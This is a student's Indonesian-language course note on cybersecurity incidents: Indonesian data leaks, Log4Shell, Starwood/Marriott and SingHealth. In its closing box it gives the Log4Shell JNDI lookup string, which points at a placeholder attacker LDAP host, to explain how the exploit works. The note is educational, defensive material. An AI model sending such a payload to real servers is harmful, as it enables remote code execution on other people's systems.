---
type: Note
cssclasses:
  - cornell-notes
---

_Back to_ [[IF4033 Keamanan Siber]]

> [!cornell] Studi Insiden Keamanan - Log4Shell, Starwood, dan SingHealth
>
> > ## Questions/Cues
> >
> > - Mengapa keamanan informasi penting? Contoh insiden apa yang relevan?
> > - Apa itu Log4Shell dan mengapa dampaknya begitu luas?
> > - Pelajaran apa dari kebocoran data Starwood dan SingHealth?
> > - Insiden mana yang terjadi di Indonesia?
> >
> > ## Reference Points
> >
> > - IF4033 Security Foundation (Slides 30-42)
>
> > ### Mengapa Insiden Perlu Dipelajari
> >
> > Setiap pelanggaran keamanan punya konsekuensinya sendiri. Studi insiden membantu menghubungkan konsep abstrak (CIA, threat, vulnerability) dengan dampak nyata.
> >
> > ### Insiden di Indonesia
> >
> > Slide merujuk beberapa kasus lokal: kebocoran **jutaan data penumpang Lion Air** yang beredar di forum, **pembobolan bank BUMN Rp16 miliar** oleh mahasiswa lewat aplikasi Kudo, sindikat peretas **Kartu Prakerja fiktif** yang membobol **12 juta data BPJS**, serta kebocoran data **PLN, Indihome, dan BIN** (2022).
> >
> > ### Log4Shell (Desember 2021)
> >
> > - **Log4J**: library logging populer untuk Java dari Apache Software Foundation; **>60%** aplikasi memakainya secara tidak langsung lewat dependensi.
> > - Kerentanan **Remote Code Execution (RCE)**: penyerang dapat menyisipkan kode ke server dan menguasainya dari jauh.
> > - **CVE-2021-44228** (dan CVE-2021-45105), skor **CVSS 10** (maksimum).
> >
> > Pelajaran: satu komponen kecil yang tertanam di rantai dependensi dapat menjadikan seluruh ekosistem rentan, sehingga inventarisasi dependensi dan patching cepat menjadi krusial.
> >
> > ### Starwood/Marriott (2018)
> >
> > Basis data tamu sekitar **500 juta** record dicuri. Akses tidak sah ke jaringan Starwood berlangsung sejak **2014** dan baru terdeteksi 2018. Sekitar 327 juta record memuat nama, alamat, telepon, tanggal lahir, email, **nomor paspor**, dan data reservasi. Pelajaran: lamanya waktu deteksi (*dwell time*) memperbesar kerugian.
> >
> > ### SingHealth (2018)
> >
> > Serangan terhadap institusi kesehatan terbesar Singapura mencuri profil **1,5 juta** pasien dan data resep **160.000** orang, termasuk Perdana Menteri Lee Hsien Loong yang "ditarget secara khusus dan berulang". Pemerintah menyebutnya serangan yang **terencana dan terarah**, bukan dari peretas biasa, dan diduga disponsori negara.

> [!cornell] #### Summary
>
> Insiden nyata menunjukkan dampak kegagalan CIA: kebocoran data di Indonesia (Lion Air, BPJS, PLN/Indihome/BIN, pembobolan bank BUMN), **Log4Shell** (CVE-2021-44228, CVSS 10, RCE pada library yang dipakai >60% aplikasi Java), **Starwood** (500 juta record, akses sejak 2014), dan **SingHealth** (1,5 juta pasien, serangan terarah diduga disponsori negara). Pelajarannya: rantai dependensi, **lamanya deteksi**, dan penyerang terencana adalah tantangan nyata.

> [!ad-libitum]- Additional Information
>
> #### Memahami Log4Shell Secara Singkat
>
> Log4J mendukung *message lookup* (JNDI). Jika string seperti `${jndi:ldap://attacker/x}` dicatat ke log, library akan mengambil dan menjalankan kelas dari server penyerang. Perbaikannya adalah upgrade dan menonaktifkan lookup.
>
> #### Proyek Eksplorasi Mandiri
> 1. Cari satu insiden kebocoran data terbaru di Indonesia, lalu petakan ke threat dan control yang gagal.
>
> #### Bacaan Lanjutan
> - NVD entry CVE-2021-44228.
> - Laporan Cyber Safety Review Board tentang Log4j.
